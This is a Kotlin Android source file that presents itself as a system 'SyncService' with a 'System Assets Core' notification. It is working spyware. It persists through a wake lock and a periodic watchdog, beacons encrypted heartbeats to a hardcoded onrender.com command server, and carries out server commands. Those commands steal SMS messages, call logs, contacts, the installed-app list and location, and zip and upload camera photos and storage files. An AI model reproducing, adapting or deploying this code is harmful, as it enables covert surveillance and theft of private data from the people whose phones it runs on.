package com.assets.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import androidx.core.app.NotificationCompat
import androidx.work.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.security.MessageDigest
import java.security.SecureRandom
import java.util.concurrent.TimeUnit
import java.util.zip.GZIPOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import java.util.concurrent.atomic.AtomicBoolean

class SovereignWatchdogWorker(appContext: Context, workerParams: WorkerParameters) : Worker(appContext, workerParams) {
    override fun doWork(): Result {
        return try {
            val serviceIntent = Intent(applicationContext, SyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(serviceIntent)
            } else {
                applicationContext.startService(serviceIntent)
            }
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}

class SyncService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val SERVER_ENDPOINT = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
    private val UPLOAD_ENDPOINT = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
    private val MASTER_SECRET = "BlackActivationMasterKey2026Sovereign"
    private var wakeLock: PowerManager.WakeLock? = null

    private val client = OkHttpClient.Builder()
        .connectTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    companion object {
        private const val CHANNEL_ID = "SystemAssetsUltimateSovereignChannel"
        private const val NOTIF_ID = 888
        private val isLoopRunning = AtomicBoolean(false)
    }

    override fun onCreate() {
        super.onCreate()
        acquireWakeLock()
        startForegroundServiceNotification()
        scheduleWatchdog()
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sovereign:UltimateWakeLock").apply {
                acquire(10 * 60 * 60 * 1000L)
            }
        } catch (e: Exception) {}
    }

    private fun startForegroundServiceNotification() {
        val channelName = "System Core Synchronization v7.8"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Assets Core")
            .setContentText("Sovereign core operational v7.8...")
            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {}
    }

    private fun scheduleWatchdog() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            val request = PeriodicWorkRequestBuilder<SovereignWatchdogWorker>(15, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .build()
            WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
                "SovereignWatchdog",
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isLoopRunning.compareAndSet(false, true)) {
            serviceScope.launch {
                while (isActive) {
                    try {
                        val telemetry = JSONObject().apply {
                            put("type", "HEARTBEAT")
                            put("status", "ONLINE_V78")
                            put("nodeId", getNodeIdentifier())
                            put("sdk", Build.VERSION.SDK_INT)
                            put("model", Build.MODEL)
                        }
                        val response = dispatchPacketWithRetry(encryptPayload(telemetry.toString()))
                        if (response != null && response.has("task")) {
                            executeTask(response.getJSONObject("task"))
                        }
                    } catch (e: Exception) {}
                    delay(3000)
                }
                isLoopRunning.set(false)
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun getNodeIdentifier(): String {
        return try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "Sovereign-Node-007"
        } catch (e: Exception) {
            "Sovereign-Node-007"
        }
    }

    private fun getDeviceSecret(): ByteArray {
        return MessageDigest.getInstance("SHA-256").digest(MASTER_SECRET.toByteArray(Charsets.UTF_8))
    }

    private fun encryptPayload(plainText: String): String {
        val byteStream = ByteArrayOutputStream()
        GZIPOutputStream(byteStream).use { it.write(plainText.toByteArray(Charsets.UTF_8)) }
        val compressed = byteStream.toByteArray()

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).apply { SecureRandom().nextBytes(this) }
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(getDeviceSecret(), "AES"), GCMParameterSpec(128, iv))

        val cipherText = cipher.doFinal(compressed)
        val encrypted = cipherText.copyOfRange(0, cipherText.size - 16)
        val tag = cipherText.copyOfRange(cipherText.size - 16, cipherText.size)

        val packet = JSONObject().apply {
            put("v", byteArrayToHex(iv))
            put("g", byteArrayToHex(tag))
            put("d", byteArrayToHex(encrypted))
        }
        return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }

    private suspend fun dispatchPacketWithRetry(payload: String): JSONObject? {
        var attempts = 0
        while (attempts < 3) {
            try {
                val req = Request.Builder()
                    .url(SERVER_ENDPOINT)
                    .post(payload.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .addHeader("x-node-id", getNodeIdentifier())
                    .addHeader("x-node-model", Build.MODEL)
                    .build()

                client.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        return JSONObject(res.body?.string() ?: "{}")
                    } else {
                        attempts++
                        delay((attempts * 2000).toLong())
                    }
                }
            } catch (e: Exception) {
                attempts++
                delay((attempts * 2000).toLong())
            }
        }
        return null
    }

    private suspend fun executeTask(task: JSONObject) {
        val action = task.optString("action", task.optString("cmd", ""))
        val nodeId = getNodeIdentifier()
        val model = Build.MODEL

        when (action.uppercase()) {
            "EXTRACT_SMS" -> sendTextReport("رسائل SMS", readSms())
            "EXTRACT_CALLS" -> sendTextReport("سجل المكالمات", readCallLogs())
            "EXTRACT_CONTACTS" -> sendTextReport("جهات الاتصال", readContacts())
            "EXTRACT_APPS" -> sendTextReport("التطبيقات المثبتة", readApps())
            "EXTRACT_LOCATION" -> sendTextReport("الموقع الجغرافي", readLocation())
            "EXTRACT_CAMERA_ZIP" -> compressAndUploadAtomicFolder(nodeId, model, "Camera", MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 500)
            "EXTRACT_STORAGE_ZIP" -> compressAndUploadAtomicStorage(nodeId, model)
            "EXTRACT_SCREENSHOT" -> sendTextReport("لقطة الشاشة", "تم طلب التقاط الشاشة الميداني.")
        }
    }

    private fun sendTextReport(title: String, content: String) {
        serviceScope.launch {
            val report = JSONObject().apply {
                put("type", "TEXT_REPORT")
                put("data", "=== $title ===\n$content")
            }
            dispatchPacketWithRetry(encryptPayload(report.toString()))
        }
    }

    private suspend fun compressAndUploadAtomicFolder(nodeId: String, model: String, folderName: String, uri: Uri, limit: Int) {
        var zipFile: File? = null
        try {
            zipFile = File(cacheDir, "Uranium_${folderName}_${System.currentTimeMillis()}.zip")
            ZipOutputStream(FileOutputStream(zipFile)).use { zipOut ->
                val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
                contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                    val dataIdx = c.getColumnIndex(MediaStore.MediaColumns.DATA)
                    val nameIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    var count = 0
                    while (c.moveToNext() && count < limit) {
                        if (dataIdx != -1 && nameIdx != -1) {
                            val filePath = c.getString(dataIdx)
                            if (filePath != null) {
                                val file = File(filePath)
                                val displayName = c.getString(nameIdx) ?: "file_$count.dat"
                                if (file.exists() && file.isFile) {
                                    try {
                                        zipOut.putNextEntry(ZipEntry(displayName))
                                        file.inputStream().use { it.copyTo(zipOut) }
                                        zipOut.closeEntry()
                                        count++
                                    } catch (ex: Exception) {}
                                }
                            }
                        }
                    }
                }
            }
            if (zipFile != null && zipFile.exists() && zipFile.length() > 0) {
                val isUploaded = uploadRawFileDirect(nodeId, model, zipFile)
                if (isUploaded) {
                    sendTextReport("ضغط المجلدات", "تم ضغط ورفع أرشيف $folderName بنجاح (${zipFile.length() / 1024} KB).")
                } else {
                    sendTextReport("خطأ الرفع", "فشل رفع أرشيف $folderName إلى السيرفر.")
                }
            }
        } catch (e: Exception) {
            sendTextReport("خطأ ضغط المجلدات", "فشل ضغط $folderName: ${e.message}")
        } finally {
            if (zipFile != null && zipFile.exists()) {
                zipFile.delete()
            }
        }
    }

    private suspend fun compressAndUploadAtomicStorage(nodeId: String, model: String) {
        compressAndUploadAtomicFolder(nodeId, model, "StorageFiles", MediaStore.Files.getContentUri("external"), 200)
    }

    private suspend fun uploadRawFileDirect(nodeId: String, model: String, file: File): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val req = Request.Builder()
                    .url(UPLOAD_ENDPOINT)
                    .post(file.asRequestBody("application/octet-stream".toMediaType()))
                    .addHeader("x-node-id", nodeId)
                    .addHeader("x-node-model", model)
                    .addHeader("x-file-name", file.name)
                    .build()

                client.newCall(req).execute().use { res ->
                    res.isSuccessful
                }
            } catch (e: Exception) {
                false
            }
        }
    }

    private fun readSms(): String {
        val sb = StringBuilder()
        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 30")?.use { c ->
            val a = c.getColumnIndex("address")
            val b = c.getColumnIndex("body")
            while (c.moveToNext()) {
                if (a != -1 && b != -1) sb.append("From: ${c.getString(a)} | Text: ${c.getString(b)}\n")
            }
        }
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder()
        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 30")?.use { c ->
            val n = c.getColumnIndex(CallLog.Calls.NUMBER)
            val t = c.getColumnIndex(CallLog.Calls.TYPE)
            while (c.moveToNext()) {
                if (n != -1 && t != -1) sb.append("Number: ${c.getString(n)} | Type: ${c.getInt(t)}\n")
            }
        }
        return sb.toString()
    }

    private fun readContacts(): String {
        val sb = StringBuilder()
        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { c ->
            val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (c.moveToNext()) {
                if (n != -1 && p != -1) sb.append("Name: ${c.getString(n)} | Phone: ${c.getString(p)}\n")
            }
        }
        return sb.toString()
    }

    private fun readApps(): String {
        val sb = StringBuilder()
        packageManager.getInstalledPackages(0).forEach { sb.append("Pkg: ${it.packageName}\n") }
        return sb.toString()
    }

    @SuppressLint("MissingPermission")
    private fun readLocation(): String {
        return try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "Location unavailable"
        } catch (e: Exception) {
            "Location error: ${e.message}"
        }
    }

    private fun byteArrayToHex(b: ByteArray): String = b.joinToString("") { "%02x".format(it) }

    override fun onDestroy() {
        isLoopRunning.set(false)
        wakeLock?.release()
        serviceScope.cancel()
        super.onDestroy()
    }
}
